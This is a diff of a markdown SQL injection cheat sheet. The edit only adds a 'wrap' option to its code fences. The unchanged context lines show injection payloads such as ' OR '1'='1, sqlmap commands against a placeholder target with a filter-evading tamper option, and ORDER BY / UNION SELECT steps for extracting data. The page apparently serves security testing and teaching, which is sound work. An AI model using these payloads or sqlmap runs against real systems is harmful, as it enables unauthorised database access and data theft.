@@ -5,7 +5,7 @@ title: "SQL Injection"
 
 Test with single quotes and boolean conditions: a syntax error or changed response confirms the injection point.
 
-```
+``` wrap
 ' OR '1'='1
 ' OR 1=1--
 ") OR ("1"="1
@@ -16,7 +16,7 @@ Test with single quotes and boolean conditions: a syntax error or changed respon
 
 Let sqlmap automate discovery and extraction: use `-r` with a saved Burp request for the cleanest results.
 
-```bash
+```bash wrap
 # Basic
 sqlmap -u "http://<IP>/page?id=1" --batch
 
@@ -42,7 +42,7 @@ sqlmap -u "http://<IP>/page?id=1" --tamper=space2comment --batch
 
 Determine the column count with ORDER BY, then use UNION SELECT to extract data: null-fill until the count matches.
 
-```sql
+```sql wrap
 ORDER BY 1--
 ORDER BY 2--
 UNION SELECT NULL,NULL,NULL--
